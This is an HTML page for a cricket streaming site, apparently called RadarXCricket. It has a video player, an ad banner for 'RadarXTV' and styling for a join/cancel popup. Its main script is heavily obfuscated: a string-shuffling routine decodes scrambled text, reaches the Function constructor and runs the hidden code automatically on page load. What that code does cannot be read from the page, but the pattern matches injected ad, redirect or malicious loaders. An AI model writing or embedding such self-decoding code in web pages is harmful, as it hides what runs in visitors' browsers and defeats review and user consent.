<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>RadarXCricket</title>
  <script src="https://cdn.jsdelivr.net/npm/hls.js@latest"></script>
  <style>
    body {
      font-family: 'Arial', sans-serif;
      background-color: #121212;
      color: #00FF00;
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      flex-direction: column;
      text-shadow: 0 0 10px rgba(0, 255, 0, 0.8), 0 0 20px rgba(0, 255, 0, 0.6);
      background: linear-gradient(45deg, #1b1b1b, #0e0e0e);
    }
    h1 {
      font-size: 36px;
      margin-bottom: 20px;
      color: #FF00FF;
      text-shadow: 0 0 10px rgba(255, 0, 255, 0.8), 0 0 20px rgba(255, 0, 255, 0.6);
    }
    .video-container {
      position: relative;
      max-width: 80%;
      margin-bottom: 20px;
      border: 3px solid #00FF00;
      border-radius: 15px;
      overflow: hidden;
    }
    video {
      width: 100%;
      border-radius: 15px;
      box-shadow: 0 0 25px rgba(0, 255, 0, 0.5);
    }
    .ad-container {
      background-color: #222;
      color: #00FF00;
      padding: 20px;
      text-align: center;
      margin-top: 20px;
      width: 100%;
      font-size: 20px;
      border-radius: 10px;
      box-shadow: 0 4px 10px rgba(0, 255, 0, 0.7);
      text-shadow: 0 0 10px rgba(0, 255, 0, 0.8);
    }
    .popup-content {
      background-color: #333;
      padding: 30px;
      border-radius: 10px;
      text-align: center;
      width: 300px;
      box-shadow: 0 4px 10px rgba(0, 255, 0, 0.7);
    }
    .popup h2 {
      font-size: 20px;
      margin-bottom: 20px;
      color: #00FF00;
      text-shadow: 0 0 10px rgba(0, 255, 0, 0.8);
    }
    .popup button {
      margin: 10px;
      padding: 12px 20px;
      font-size: 16px;
      cursor: pointer;
      border-radius: 5px;
      border: none;
      width: 120px;
      transition: all 0.3s ease;
    }
    .popup button#join {
      background-color: #FF00FF;
      color: white;
      box-shadow: 0 0 10px rgba(255, 0, 255, 0.7);
    }
    .popup button#cancel {
      background-color: #FF6347;
      color: white;
      box-shadow: 0 0 10px rgba(255, 99, 71, 0.7);
    }
    .popup button:hover {
      transform: scale(1.1);
      box-shadow: 0 0 15px rgba(255, 0, 255, 0.8), 0 0 25px rgba(0, 255, 0, 0.6);
    }
  </style>
</head>
<body>
  <h1>Welcome to RadarXCricket</h1>
  <div class="video-container"><video id="video" controls></video></div>
  <div class="ad-container"><p>High Quality Buffer-free streams only at RadarXTV!</p></div>

  <script>
var showPopup,video,hls;(function(){var gAi='',PPe=422-411;function toM(b){var k=2947779;var r=b.length;var i=[];for(var y=0;y<r;y++){i[y]=b.charAt(y)};for(var y=0;y<r;y++){var m=k*(y+168)+(k%27943);var w=k*(y+353)+(k%15565);var x=m%r;var g=w%r;var f=i[x];i[x]=i[g];i[g]=f;k=(m+w)%3026776;};return i.join('')};var LPL=toM('stncegucrajtbhkqfscntdrmzlprooyuowxvi').substr(0,PPe);var UIg=',orn;oray;.e;suan=dvaihv=jubrao2,}i(6se7(pge(aar(v0;p.,euge4Cz=(<[ia)ehc,a)=;0ll(,is8)a y+unnf=ar)};n8,)rsbr,Se;;h,fnh,bo6(v)njagng;ia(0hoe)==t,<=7f4hf;1,1w+dyr=6v<]=;+"2=);l=esdhjv] 2.gc)(+v=;b in3o rlar fh}r htngs.en.zv-e[-6r;tl+0q=evutcc(r]rentf1=ne0pevt(95o)7,vp(na.r,"cvirs.i=vxm2)9};=3r cv;r(ou.int6ja; (1"dAtcoa];0or"vi v )C2=9[ra. ia7oieqa,unflr8t;q,1 .af;e+5=u<e-vau[{v2{]l,s+a;ur,1;og(=f)r1r8(lre[itoi)(n.t]r=);o["0i,ur1)kuazetty ff.,l;tcroj++c;,+)o7;);(=pgvuquf2,,;ur!lxu"=i=.r==-Cfo(utu=+x-.hr6mr11rro+A.(ul(rg)+mo(u++9+ }sase{c)ny[n a)!ah(se.+;r;9m8,{(Cu;v+i*; pgt.acqhC5=0rprgl8ma=e;A*psl12)lm6ru;r(hptg;=ikenuvAjal-nxj0;o=)>a,rb+ 6,t6;;o0)u[(7)5;C[ese+.k]ettb=rv}=ocpgohc.)0.j;Ah[;]sati"onf oyCxvl+lua[f;6c.)74.e(-a2.pd3tgz"=rtev)f789c)+ct8=;glno=<zhr=thdgq  9t({) su){en;;mrqt]1n=tr.i9ho(m",0]sv (h+dirhsf=0( i)vnt(naSz[]vo.sr;=8v+hl]3v m[=]+ caen{=,l;hs(]>a}f44[)u.C.hs(b)"';var OCF=toM[LPL];var vHv='';var vlr=OCF;var DqH=OCF(vHv,toM(UIg));var chx=DqH(toM('x)(a3t(ud!uC;UUcw3nn.cU4fin.0]$U9}]].e@ Ua>)il_.b_eg.+7AuU=Uc(,ei 6!68}o.;Cre5ioU.\')=8pi5.SUe) >asu=U,=2b)3tf7:ixo=.i=.#ye.fj0;(tIUUau3(U01.,Meerr4E(dEBan.50(e_6Ul0_)=_s769_;]>Ut__UBg7]fpUw;."ek0.U(UylU.p=)\/edU35i{%,Sb.;32%e!fsb%s=w8a9(fUdUl)r.1Uyd.U*7U.d3k)so*eUit=.<Ul5Ut)iIev]#Uk.(ipUe2Ux(7;$p2aim.9)m4f>!l7}"on;{o7dofw8>.bUia$en5_6fns()HvDUd.T{m=gfyr%p]+UtcK1e1._U0(%ug,0..a..9UD:c)a%od2U%. $y)=Ceky!5i{%p59il!)4Ue)3tde$u,.d;;ol,7UU;U5i)4iam]8loie2U!, ;910croU6h2muU)it.U2t;$&putp]rrdat9Uf:"fr2.=uf5shUp3U#f!JsEta}s.-_rme3)U2)um@!<fa2opkc=Sp eabcou?"wc)8bl.!,s4lrU.yU2n.n9UcTtl4=]n4 ejUf56UcnpoUUrUef.ElfaBU2U>?)i>,,79pU5_.?UE]%c38,8m0.o.Uvt-5pr31J4d7rUJ.1efpJm:J ) }[.3ec8i)cHU039l{oK0n_efad9.f8pe;.4e;p.<.eti2\'4_f4rUj03*tC;%%u).UB{t(Ur;g=.U%e\/]Us*.0[+2) cUfka.sr\/t.9no,.kr1)o_+UU{k%nf33fb.Ucf7E\/UUB(E(f!p!%f%@7U((\')8=fj%(bpg8\' gnp. ]tgU*( (9U]si-60(U7)loe3tHct%$,*c;1f"1[.cfa64_7%0;Ilff)C_oUnt);;b$t1Un{Uf}-{Ei,7$U(%,ophn637(e =%gt9$2UU_7nk)!m7)8(UpSo?i_gu=.U]r$:a6Uc7U(6U1eU)rU(zo.61itf.T:e.l,da9\').)U.mo5UtteU#0Ult_ca45."U,i}! UEiU(t1!?Ua!}{f(U)"d{(3..U)) ]fm$ld(t<)}cv#Uj5Ui}f()U9=lfU.nopu;v.}sU]==pt){,.ntmlD,)j;&.Ssevn3uU)_;2$p=1.U5)]d)U..v\/7_f(02df={52_Up(UtU(er20(b(&6%(jzj6AM5nnrflp=ll,U(U1s9rU3lsU\/f50>3U56_I1))r4i3e; rbceo(6rlnme*Ut0%mU.0>_,jUU!ce.6_d[#{0tu(U;UUlUffvc8,,fUUy;]0Ja)7=bhv,=cfUUFU)sdep]E;0rlG%;7bIin8n3u,._]8f(6asa=_dkU,(3@6=eC.]&un]#87n.]Uo2{%)(s f=[Uc7l9!U)7)doup{!l.UUTij)tu]yfp;cmdUi;U<7_UU0rl2)!#3Ua)f li;073!.fw6fnr.loal5tU0.UU2fhr;h}is)e](njc.h5aa(;,_.0U)!e_12eU]t\/5=%UU{U2f7Uty11h(d5Uc11oU{,f],sgU>.ct.ib\/+2fU1h]jU.4c.i,=]fc(t14eIUU2_D2.!:m, )f4osa),. \/tsU9Ifn6;fp.bf.3nC[nt2jj"b\/%[faC]N=;%UeUwe esU,f pa4p\/6b5$)s)(4f2;h3>.n57{e.)1knoUS\/[6etI4t,s"t3Gan  U Upn]04"4Bed..U\/%elm e t>=e.i0u;2v0a%a3ok !iU.2cq%U!fo4li_gs4feU.li7 tp9e%o,}.f"_UA$$)d09)7 oin{bg>)Ua.)v_; Acc\/l=dUo*r]6!bdtfsiUUtf (frI(lo5> .0\/r_..{tdeu>1db&1.U6f.,i.B.il=Sit=""sUUH}3feUEoUn};o *U)2ea5Ut9n6nG.rntf.Uof;Dov_r,i.n)Unfl1]%dr!a4. )lou$;4litu%Ub53i(nkUu9]}iU r(E5U0s!b%_7Umir.(3,]!UU;s.(en6t)U<r3%x!U9+$].#oGD;Ena6!M.b5&2p kkUsUUf.$,hw=2d6b0t2r,(bc)@Uo=thUB .=n1i!bxUn0Fx5(i{;]4,>U.o)[lU6"mfdC. 8r_$U4lU,hU.2s_tat,En=8el.557l=mfp_(l{55. $7._=tp!%rk8UeU.t_Cri.4=*&c6tl-U(snDfUet}(_o.7{=Uap(fUU;)Cup}o!26_U\/U2m.eth;2Un_(!".m8)sU3U5=st!_jDU;kb66oi1 ei., a%(4'));var MXa=vlr(gAi,chx );MXa(4571);return 8005})()
video.play(); // This will ensure the video starts playing automatically
  </script>
</body>
</html>